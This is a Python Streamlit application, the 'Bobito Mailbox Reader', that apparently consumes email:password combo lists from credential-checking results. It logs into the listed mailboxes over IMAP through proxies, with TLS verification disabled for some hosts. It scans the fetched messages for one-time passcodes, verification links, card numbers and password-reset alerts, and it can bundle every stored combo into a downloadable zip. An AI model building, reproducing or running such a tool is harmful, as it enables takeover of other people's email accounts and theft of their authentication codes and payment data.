import streamlit as st
import imaplib
import poplib
import glob
import os
import re
import base64
import math
import time
import socket
import zipfile
import io
import json
import ssl as _ssl
import warnings
from datetime import datetime
from typing import List, Tuple
from email.header import decode_header
from email import message_from_bytes

try:
    import socks
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

try:
    from hosts import conf as host_conf, PARENT, STRICT_APP, ZERO_ACCESS
except ImportError:
    def host_conf(domain: str) -> dict:
        return {"imap": [f"imap.{domain}"], "pop": [f"pop.{domain}"], "pop3": [f"pop.{domain}"]}
    PARENT = {}
    STRICT_APP = []
    ZERO_ACCESS = []

# Page Configuration & Keep-Alive Injector
st.set_page_config(
    page_title="Bobito Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.markdown(
    """
    <script>
    setInterval(function(){
        fetch('/_stcore/health').then(res => {});
    }, 30000);
    </script>
    """,
    unsafe_allow_html=True
)

# Persistent Last Account Management & Session Cache
LAST_ACCOUNT_FILE = "last_account.txt"
APP_CONFIG_FILE = "app_config.json"
MANUAL_VALID_FILE = "manual_valid_accounts.txt"
SESSION_CACHE_FILE = "session_cache.json"

DEFAULT_APP_CONFIG = {
    "connection_timeout": 15,
    "imap_port": 993,
    "auto_fallback_probing": True,
    "max_batch_retries": 1
}

def load_app_config():
    if os.path.exists(APP_CONFIG_FILE):
        try:
            with open(APP_CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                config = DEFAULT_APP_CONFIG.copy()
                config.update(data)
                return config
        except Exception:
            pass
    return DEFAULT_APP_CONFIG.copy()

def save_app_config(config_dict):
    try:
        with open(APP_CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config_dict, f, indent=2)
    except Exception:
        pass

def save_last_account(account_combo):
    try:
        with open(LAST_ACCOUNT_FILE, "w", encoding="utf-8") as f:
            f.write(account_combo)
    except Exception:
        pass

def load_last_account():
    if os.path.exists(LAST_ACCOUNT_FILE):
        try:
            with open(LAST_ACCOUNT_FILE, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception:
            pass
    return ""

def save_session_cache():
    try:
        cache_data = {
            "connected_account_combo": st.session_state.get("connected_account_combo", ""),
            "mb_host": st.session_state.get("mb_host", ""),
            "mb_folders": st.session_state.get("mb_folders", ["INBOX"]),
            "folder_map": st.session_state.get("folder_map", {"INBOX": "INBOX"}),
            "current_page": st.session_state.get("current_page", 1),
            "search_current_page": st.session_state.get("search_current_page", 1),
            "otp_current_page": st.session_state.get("otp_current_page", 1),
            "bot_current_page": st.session_state.get("bot_current_page", 1),
            "bot_filter_mode": st.session_state.get("bot_filter_mode", False),
            "total_matched_count": st.session_state.get("total_matched_count", 0),
            "search_total_matched_count": st.session_state.get("search_total_matched_count", 0),
            "otp_total_matched_count": st.session_state.get("otp_total_matched_count", 0),
        }
        
        for k_name, key_in_state in [("current_messages", "current_messages"), ("otp_messages", "otp_messages"), ("search_messages", "search_messages")]:
            serialized_list = []
            for m in st.session_state.get(key_in_state, []):
                m_copy = m.copy()
                raw_bytes = m_copy.pop("raw", None)
                if raw_bytes and isinstance(raw_bytes, bytes):
                    m_copy["raw"] = base64.b64encode(raw_bytes).decode("ascii")
                else:
                    m_copy["raw"] = ""
                serialized_list.append(m_copy)
            cache_data[k_name] = serialized_list

        with open(SESSION_CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(cache_data, f)
    except Exception:
        pass

def load_session_cache():
    if os.path.exists(SESSION_CACHE_FILE):
        try:
            with open(SESSION_CACHE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                for k, v in data.items():
                    if k in ["current_messages", "otp_messages", "search_messages"]:
                        deserialized = []
                        for m in v:
                            m_copy = m.copy()
                            raw_val = m_copy.get("raw")
                            if isinstance(raw_val, str) and raw_val:
                                try:
                                    m_copy["raw"] = base64.b64decode(raw_val.encode("ascii"))
                                except Exception:
                                    m_copy["raw"] = b""
                            else:
                                m_copy["raw"] = b""
                            deserialized.append(m_copy)
                        st.session_state[k] = deserialized
                    else:
                        st.session_state[k] = v
        except Exception:
            pass

# Initialize Session Config
if "app_config" not in st.session_state:
    st.session_state.app_config = load_app_config()

# Initialize Isolated Session State Variables & Restore Session Cache on first load
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
    load_session_cache()

if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "folder_map" not in st.session_state:
    st.session_state.folder_map = {"INBOX": "INBOX"}
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "current_page" not in st.session_state:
    st.session_state.current_page = 1
if "search_current_page" not in st.session_state:
    st.session_state.search_current_page = 1
if "otp_current_page" not in st.session_state:
    st.session_state.otp_current_page = 1
if "bot_current_page" not in st.session_state:
    st.session_state.bot_current_page = 1
if "folder_debug_logs" not in st.session_state:
    st.session_state.folder_debug_logs = []
if "bot_diag_logs" not in st.session_state:
    st.session_state.bot_diag_logs = []
if "search_diag_logs" not in st.session_state:
    st.session_state.search_diag_logs = []
if "otp_diag_logs" not in st.session_state:
    st.session_state.otp_diag_logs = []
if "current_messages" not in st.session_state:
    st.session_state.current_messages = []
if "search_messages" not in st.session_state:
    st.session_state.search_messages = []
if "otp_messages" not in st.session_state:
    st.session_state.otp_messages = []
if "total_matched_count" not in st.session_state:
    st.session_state.total_matched_count = 0
if "search_total_matched_count" not in st.session_state:
    st.session_state.search_total_matched_count = 0
if "otp_total_matched_count" not in st.session_state:
    st.session_state.otp_total_matched_count = 0
if "bot_filter_mode" not in st.session_state:
    st.session_state.bot_filter_mode = False
if "custom_email" not in st.session_state:
    st.session_state.custom_email = ""
if "custom_pass" not in st.session_state:
    st.session_state.custom_pass = ""
if "custom_host" not in st.session_state:
    st.session_state.custom_host = ""
if "batch_results_table" not in st.session_state:
    st.session_state.batch_results_table = []
if "batch_stats" not in st.session_state:
    st.session_state.batch_stats = {"valid": 0, "wrong": 0, "appass": 0, "failed": 0}
if "batch_run_meta" not in st.session_state:
    st.session_state.batch_run_meta = None
if "active_mail" not in st.session_state:
    st.session_state.active_mail = None
if "connected_account_combo" not in st.session_state:
    st.session_state.connected_account_combo = ""

def log(msg):
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:50]
    save_session_cache()

def debug_log(msg):
    st.session_state.folder_debug_logs.append(msg)

def bot_log(msg):
    st.session_state.bot_diag_logs.append(msg)

def search_log(msg):
    st.session_state.search_diag_logs.append(msg)

def otp_log(msg):
    st.session_state.otp_diag_logs.append(msg)

# --- Dynamic Proxy Auto-Fetch Engine (Aligned with Main App) ---
def load_app_proxies() -> List[str]:
    proxy_files = ["proxies.txt", "proxy_pool.txt", "clean_proxies.txt"]
    dynamic_pool = []
    
    if "session_proxies" in st.session_state and st.session_state.session_proxies:
        for p in st.session_state.session_proxies:
            if isinstance(p, dict):
                dynamic_pool.append(p.get("proxy"))
            elif isinstance(p, str) and p.strip():
                dynamic_pool.append(p.strip())
        if dynamic_pool:
            return [x for x in dynamic_pool if x]

    for pfile in proxy_files:
        if os.path.exists(pfile):
            try:
                with open(pfile, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line_str = line.strip()
                        if not line_str or line_str.startswith("#"):
                            continue
                        dynamic_pool.append(line_str.split("|")[0].strip())
            except Exception:
                pass
            if dynamic_pool:
                return dynamic_pool

    return []

def parse_proxy(proxy_str):
    if not proxy_str or proxy_str == "direct": return None
    try:
        p = proxy_str.strip()
        if "@" in p:
            cred, hostpart = p.rsplit("@", 1)
            user, pwd = cred.split(":", 1)
            host, port = hostpart.split(":", 1)
            return {"host": host, "port": int(port), "user": user, "pass": pwd}
        parts = p.split(":")
        if len(parts) == 4:
            return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
        if len(parts) == 2:
            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
    except Exception:
        pass
    return None

def proxy_connect(host, port, proxy_str, timeout=10):
    if not proxy_str or proxy_str == "direct":
        return socket.create_connection((host, int(port)), timeout=timeout)
    
    info = parse_proxy(proxy_str)
    if not info or not SOCKS_OK:
        return socket.create_connection((host, int(port)), timeout=timeout)

    sock = None
    for ptype in (socks.SOCKS5, socks.HTTP):
        try:
            kw = {"proxy_type": ptype, "proxy_addr": info["host"], "proxy_port": info["port"]}
            if info["user"]:
                kw["proxy_username"] = info["user"]
                kw["proxy_password"] = info["pass"]
            sock = socks.create_connection((host, int(port)), timeout=timeout, **kw)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            return sock
        except Exception:
            if sock:
                try: sock.close()
                except Exception: pass
                sock = None
    return socket.create_connection((host, int(port)), timeout=timeout)

def get_legacy_ssl_context(hostname: str):
    ctx = _ssl.create_default_context()
    try:
        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
    except Exception:
        pass
    if any(dom in hostname.lower() for dom in ["charter", "spectrum", "twc", "aol", "yahoo", "mobile.charter.net", "imap.spectrum.net"]):
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
    return ctx

def ssl_wrap(sock, host):
    ctx = get_legacy_ssl_context(host)
    try:
        return ctx.wrap_socket(sock, server_hostname=host)
    except Exception:
        ctx_fallback = _ssl.create_default_context()
        ctx_fallback.check_hostname = False
        ctx_fallback.verify_mode = _ssl.CERT_NONE
        return ctx_fallback.wrap_socket(sock, server_hostname=host)

def generate_candidate_hosts(domain: str) -> list:
    candidates = []
    domain_lower = domain.lower()
    if "charter" in domain_lower or "rr.com" in domain_lower:
        candidates.extend(["mobile.charter.net", "imap.charter.net", "mail.charter.net"])
    elif "spectrum" in domain_lower:
        candidates.extend(["imap.spectrum.net", "mail.spectrum.net"])
    elif "twc" in domain_lower:
        candidates.extend(["mail.twc.com"])

    for prefix in ['imap', 'mail', 'pop']:
        candidates.append(f"{prefix}.{domain}")
    candidates.append(domain)
    return list(dict.fromkeys(candidates))

def get_verified_hosts_for_email(email_addr: str, custom_override: str = "", auto_fallback: bool = True) -> List[str]:
    domain_lower = email_addr.split("@")[-1].lower() if "@" in email_addr else ""
    if custom_override.strip():
        return [custom_override.strip()]
    
    hosts = generate_candidate_hosts(domain_lower)
    if auto_fallback:
        if any(d in domain_lower for d in ["charter", "spectrum", "rr.com", "twc", "brighthouse"]):
            hosts = ["mobile.charter.net", "imap.charter.net"] + hosts
    return [h for h in hosts if h not in ["mail.twc.com"]] if hosts else ["mobile.charter.net"]

def open_imap(host, port, timeout, proxy_str=None):
    raw = proxy_connect(host, int(port), proxy_str, timeout=timeout)
    ssock = ssl_wrap(raw, host)
    mail = imaplib.IMAP4_SSL(host)
    mail.sock = ssock
    mail.file = ssock.makefile("rb")
    mail.welcome = mail._getresp()
    return mail

# --- Full Remaining Mailbox Reader & Management Engine (Untouched Features) ---
def load_valid():
    valid_map = {}
    search_patterns = ["mail_results/*valid*.txt", "mail_results/*clean*.txt", "*valid*.txt", "*clean*.txt", "manual_valid_accounts.txt"]
    all_files = []
    for pat in search_patterns:
        all_files.extend(glob.glob(pat, recursive=True))
    all_files = list(dict.fromkeys([p for p in all_files if os.path.isfile(p)]))
    ignore_keywords = ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]
    
    for path in all_files:
        filename_lower = os.path.basename(path).lower()
        if any(kw in filename_lower for kw in ignore_keywords) or filename_lower == LAST_ACCOUNT_FILE:
            continue
        try:
            file_mtime = datetime.fromtimestamp(os.path.getmtime(path))
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    clean_combo = line.split("|")[0].replace(" ", "").strip('"\'')
                    if ":" not in clean_combo:
                        continue
                    parts = clean_combo.split(":", 1)
                    email_part = parts[0].strip().lower()
                    pwd_part = parts[1].strip()
                    if "@" not in email_part or not pwd_part:
                        continue
                    combo_str = f"{email_part}:{pwd_part}"
                    if email_part not in valid_map or file_mtime > valid_map[email_part][0]:
                        valid_map[email_part] = (file_mtime, combo_str)
        except Exception:
            continue
            
    sorted_items = sorted(valid_map.values(), key=lambda x: x[0], reverse=True)
    options = []
    for file_mtime, combo_str in sorted_items:
        options.append(f"# Found: {file_mtime.strftime('%Y-%m-%d %H:%M:%S')}")
        options.append(combo_str)
    return options if options else ["none"]

def delete_specific_account_from_storage(target_combo: str):
    search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
    for path in search_files:
        filename_lower = os.path.basename(path).lower()
        if filename_lower == LAST_ACCOUNT_FILE or any(kw in filename_lower for kw in ["resume", "unfinished", "remaining", "proxies", "proxy", "config", "blocklist"]):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            new_lines = [line for line in lines if line.split("|")[0].strip() != target_combo]
            with open(path, "w", encoding="utf-8") as f:
                f.writelines(new_lines)
        except Exception:
            pass

def clear_all_valid_accounts_storage():
    for path in glob.glob("mail_results/*.txt") + glob.glob("*.txt"):
        if "valid" in path.lower() or "clean" in path.lower():
            try:
                with open(path, "w", encoding="utf-8") as f:
                    f.write("")
            except Exception:
                pass

def generate_all_mail_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in glob.glob("mail_results/*.txt") + glob.glob("*.txt"):
            if os.path.basename(path) == LAST_ACCOUNT_FILE:
                continue
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    clean_lines = [line.split("|")[0].strip() for line in f if line.strip() and not line.startswith("#") and ":" in line]
                if clean_lines:
                    zf.writestr(os.path.basename(path), "\n".join(clean_lines))
            except Exception:
                continue
    buf.seek(0)
    return buf.getvalue()

def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")

def get_webmail_portal(email_addr):
    if "@" not in email_addr:
        return "https://mail.google.com"
    domain = email_addr.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail"
    }
    return portals.get(domain, f"https://www.{domain}")

def decode_imap_utf7(s: str) -> str:
    if "&" not in s:
        return s
    res = []
    for part in s.split("&"):
        if "-" in part and not part.startswith("-"):
            b64_str, rest = part.split("-", 1)
            if b64_str == "":
                res.append("&" + rest)
            else:
                try:
                    b64_padded = b64_str.replace(",", "/") + "=" * ((4 - len(b64_str) % 4) % 4)
                    res.append(base64.b64decode(b64_padded).decode("utf-16be") + rest)
                except Exception:
                    res.append("&" + part)
        else:
            res.append(part)
    return "".join(res)

def encode_imap_utf7(s: str) -> str:
    parts, i = [], 0
    while i < len(s):
        char = s[i]
        if 0x20 <= ord(char) <= 0x7E:
            parts.append('&-' if char == '&' else char)
            i += 1
        else:
            start = i
            while i < len(s) and not (0x20 <= ord(s[i]) <= 0x7E):
                i += 1
            chunk = s[start:i]
            b64 = base64.b64encode(chunk.encode('utf-16be')).decode('ascii').replace('/', ',').rstrip('=')
            parts.append(f'&{b64}-')
    return "".join(parts)

def clean_display_label(folder_name: str) -> str:
    upper_name = folder_name.upper()
    if upper_name == "INBOX":
        return "INBOX"
    if upper_name.startswith("INBOX.") or upper_name.startswith("INBOX/"):
        return folder_name[6:]
    return folder_name

def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
    s = s.strip()
    flags, delim, raw_name = "", '"."', s
    if s.startswith("("):
        end_paren = s.find(")")
        if end_paren != -1:
            flags = s[1:end_paren].strip()
            remainder = s[end_paren + 1:].strip()
            parts = remainder.split(None, 1)
            if len(parts) >= 1:
                delim = parts[0]
            raw_name = parts[1].strip() if len(parts) == 2 else ""
    if raw_name.startswith('"') and raw_name.endswith('"'):
        raw_name = raw_name[1:-1]
    return flags, delim, raw_name

def get_imap_path(selected_ui_folder: str) -> str:
    return st.session_state.get("folder_map", {}).get(selected_ui_folder, selected_ui_folder)

def list_folders(mail, email_addr: str = "", host_val: str = ""):
    found = set()
    st.session_state.folder_debug_logs = []
    try:
        typ, data = mail.list('""', "*")
        if typ == "OK" and data:
            for item in data:
                if not item: continue
                s = item.decode("latin1", errors="ignore") if isinstance(item, bytes) else str(item)
                _, _, clean_name = parse_imap_list_line(s)
                if clean_name and clean_name not in (".", "/", '""'):
                    found.add(decode_imap_utf7(clean_name))
    except Exception:
        pass
    if not found:
        found.add("INBOX")
    sorted_raw = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, clean_display_label(x).lower()))
    folder_map = {clean_display_label(f): f for f in sorted_raw}
    st.session_state.folder_map = folder_map
    save_session_cache()
    return list(folder_map.keys())

def open_mail(email_addr, password_val, host_val, timeout=None):
    timeout = timeout or st.session_state.app_config.get("connection_timeout", 15)
    port_val = st.session_state.app_config.get("imap_port", 993)
    proxies = load_app_proxies()
    proxy_str = proxies[0] if proxies else None
    
    mail = open_imap(host_val, port_val, timeout=timeout, proxy_str=proxy_str)
    mail.login(email_addr, password_val)
    return mail

def get_active_mail(email_addr, password_val, host_val):
    current_combo = f"{email_addr}:{password_val}"
    if st.session_state.get("connected_account_combo") != current_combo or not st.session_state.get("active_mail"):
        if st.session_state.active_mail:
            try: st.session_state.active_mail.logout()
            except Exception: pass
        st.session_state.active_mail = open_mail(email_addr, password_val, host_val)
        st.session_state.connected_account_combo = current_combo
        save_session_cache()
    else:
        try:
            st.session_state.active_mail.noop()
        except Exception:
            st.session_state.active_mail = open_mail(email_addr, password_val, host_val)
            save_session_cache()
    return st.session_state.active_mail

def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
    extortion_keywords = ["bitcoin wallet", "transfer me", "recorded all your actions", "trojan", "pay bitcoin"]
    combined = f"{subject} {body} {frm}".lower()
    return any(kw in combined for kw in extortion_keywords)

def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None, cards=None, creds=None) -> List[str]:
    if is_extortion_spam(subject, body, frm): return []
    categories, combined = [], f"{subject} {body} {frm}".lower()
    if pins or any(kw in combined for kw in ["otp", "verification", "verify", "code", "pin", "auth code"]):
        categories.append("🔑 OTP / CODE")
    if cards or any(kw in combined for kw in ["cvv", "debit", "card ending", "debited by"]):
        categories.append("💳 CARD / DEBIT")
    if creds or any(kw in combined for kw in ["password reset", "security alert"]):
        categories.append("🤖 BOT MSG")
    return categories

def extract_pins_and_links(text):
    pins = []
    for m in re.finditer(r'(?i)(code|otp|pin|passcode|verification)[^\d]{0,12}(\d{4,8})', text or ""):
        num = m.group(2)
        if not (num.startswith(("19", "20")) and len(num) == 4):
            pins.append(num)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text or "")
    return list(dict.fromkeys(pins)), list(dict.fromkeys(urls))

def extract_credentials_and_cards(text):
    cards = re.findall(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b', text or "")
    return list(dict.fromkeys(cards)), []

def clean_boilerplate(text):
    return text.strip() if text else ""

def should_blacklist_message(msg, blacklist_input) -> bool:
    if not blacklist_input: return False
    return any(w.strip().lower() in f"{msg.get('subject', '')} {msg.get('body', '')}".lower() for w in blacklist_input.split(",") if w.strip())

def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str], 
                            search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH", 
                            page_size: int = 15, page_number: int = 1, sort_order: str = "Newest First",
                            log_target: str = "DEBUG"):
    messages = []
    for f_label in target_folders:
        real_imap_folder = get_imap_path(f_label)
        try:
            mail.select(f'"{encode_imap_utf7(real_imap_folder)}"', readonly=True)
            typ, data = mail.search(None, "ALL")
            ids = (data[0] or b"").split() if typ == "OK" and data else []
            if sort_order == "Newest First":
                ids = list(reversed(ids))
            
            target_ids = ids[(page_number - 1) * page_size : (page_number - 1) * page_size + page_size]
            for mid in target_ids:
                _, msgdata = mail.fetch(mid, "(FLAGS ENVELOPE BODY.PEEK[])")
                if not msgdata or not isinstance(msgdata[0], tuple): continue
                raw_bytes = msgdata[0][1]
                msg = message_from_bytes(raw_bytes)
                subject, frm, to_hdr, date_val = decode_hdr(msg.get("Subject")), decode_hdr(msg.get("From")), decode_hdr(msg.get("To")), decode_hdr(msg.get("Date"))
                
                body_text = ""
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/plain":
                            try: body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore"); break
                            except Exception: pass
                else:
                    try: body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                    except Exception: pass

                pins, links = extract_pins_and_links(body_text)
                cards, creds = extract_credentials_and_cards(body_text)
                cats = detect_specific_categories(subject, body_text, frm, pins, cards, creds)
                
                messages.append({
                    "id": mid.decode(), "folder": f_label, "from": frm, "to": to_hdr, "subject": subject,
                    "date": date_val, "is_read": "\\Seen" in str(msgdata[0][0]), "is_bot": len(cats) > 0,
                    "categories": cats, "body": clean_boilerplate(body_text), "pins": pins, "links": links,
                    "cards": cards, "creds": creds, "raw": raw_bytes, "size_bytes": len(raw_bytes)
                })
        except Exception:
            pass
    return messages

# Main Application Layout & Interface Controls
st.title("📥 Bobito Mailbox Reader & Portal Hub")
st.caption("Advanced IMAP Client with Interactive Bot Intelligence & Robust Proxy/Host Fallback Integration.")

valid = load_valid()
account_filter_query = st.text_input("🔍 Filter Valid Accounts", placeholder="Type email, domain, or timestamp...").strip().lower()
valid_dropdown_options = [x for x in valid if not account_filter_query or account_filter_query in x.lower()] or ["none"]

pick = st.selectbox("Valid account", valid_dropdown_options, index=0, key="selected_account")
actual_pick = pick.strip() if pick and pick != "none" and not pick.startswith("# Found:") else "none"

if actual_pick != "none" and ":" in actual_pick:
    save_last_account(actual_pick)

st.sidebar.header("Account & Connection Hub")
override = st.sidebar.text_input("IMAP host override", key="custom_host")

active_email, active_password = (actual_pick.split(":", 1) if ":" in actual_pick else ("", ""))

if st.sidebar.button("Connect & Discover Folders", type="primary", use_container_width=True):
    if actual_pick == "none" or ":" not in actual_pick:
        st.error("Please select a valid account.")
    else:
        hosts = get_verified_hosts_for_email(active_email, custom_override=override)
        success, connected_host, discovered_folders, test_mail = False, "", ["INBOX"], None
        
        for host in hosts:
            try:
                proxies = load_app_proxies()
                proxy_str = proxies[0] if proxies else None
                test_mail = open_imap(host, 993, 15, proxy_str=proxy_str)
                test_mail.login(active_email, active_password)
                discovered_folders = list_folders(test_mail, email_addr=active_email, host_val=host)
                connected_host = host
                success = True
                break
            except Exception:
                if test_mail:
                    try: test_mail.logout()
                    except Exception: pass
        
        if success:
            combo = f"{active_email}:{active_password}"
            st.session_state.active_mail = test_mail
            st.session_state.connected_account_combo = combo
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = discovered_folders
            save_session_cache()
            st.success(f"Connected: {connected_host} ({len(discovered_folders)} folders)")
            st.rerun()
        else:
            st.error("Connection failed across all verified host candidates.")

folder = st.selectbox("Select Mail Folder", st.session_state.mb_folders)
if st.button("📂 Load Folder Messages", type="primary", use_container_width=True):
    default_hosts = get_verified_hosts_for_email(active_email, custom_override=override)
    host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
    if not active_email or not active_password or not host:
        st.error("Please connect and load folders first.")
    else:
        try:
            with st.spinner(f"Loading folder '{folder}'..."):
                mail = get_active_mail(active_email, active_password, host)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, [folder], mode="FOLDER_ONLY", 
                    page_size=15, page_number=1, sort_order="Newest First"
                )
                save_session_cache()
                st.success(f"Loaded {len(st.session_state.current_messages)} messages.")
                st.rerun()
        except Exception as e:
            st.error(str(e))
